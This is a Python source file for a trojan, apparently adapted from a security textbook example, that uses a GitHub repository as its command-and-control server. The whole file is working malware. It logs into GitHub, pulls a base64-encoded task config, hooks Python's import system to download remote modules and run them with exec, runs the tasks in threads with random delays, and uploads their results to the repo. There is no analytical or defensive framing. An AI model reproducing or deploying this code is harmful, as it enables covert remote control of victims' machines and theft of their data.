import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojanID = "abc"

trojanConfig        = "%s.json" % trojanID
dataPath            = "data/%s/" % trojanID
trojanModules       = []
configured          = False
taskQueue           = Queue.Queue()

def connectToGithub():
    gh = login(username="<username>", password="<password>")
    repo = gh.repository("<username>", "<repo>")
    branch = repo.branch("master")

    return gh, repo, branch

def getFileContents(filePath):

    gh, repo, branch = connectToGithub()
    tree = branch.commit.commit.tree.to_tree().recurse()

    for fileName in tree.tree:
        if filePath in fileName.path:
            print "[*] Found file %s" % filePath
            blob = repo.blob(fileName._json_data['sha'])
            return blob.content

    return None

def getTrojanConfig():
    global configured
    configJSON      = getFileContents(trojanConfig)
    config          = json.loads(base64.b64decode(configJSON))
    configured      = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])

    return config

def storeModuleResult(data):
    gh, repo, branch = connectToGithub()

    remotePath = "data/%s/%d.data" % (trojanID, random.randint(1000,1000000))
    repo.create_file(remotePath, "data", base64.b64encode(data))

    return

class GitImporter(object):
    def __init__(self):
        self.currentModuleCode = ""

    def find_module(self, fullName, path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullName
            newLibrary = getFileContents("modules/%s" % fullName)

            if newLibrary is not None:
                self.currentModuleCode = base64.b64decode(newLibrary)
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec self.currentModuleCode in module.__dict__
        sys.modules[name] = module

        return module

def moduleRunner(module):
    taskQueue.put(1)
    result = sys.modules[module].run()
    taskQueue.get()

    # store result in repo
    storeModuleResult(result)

    return

# main loop
sys.meta_path = [GitImporter()]

while True:
    if taskQueue.empty():
        config = getTrojanConfig()

        for task in config:
            t = threading.Thread(target=moduleRunner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(10,30))

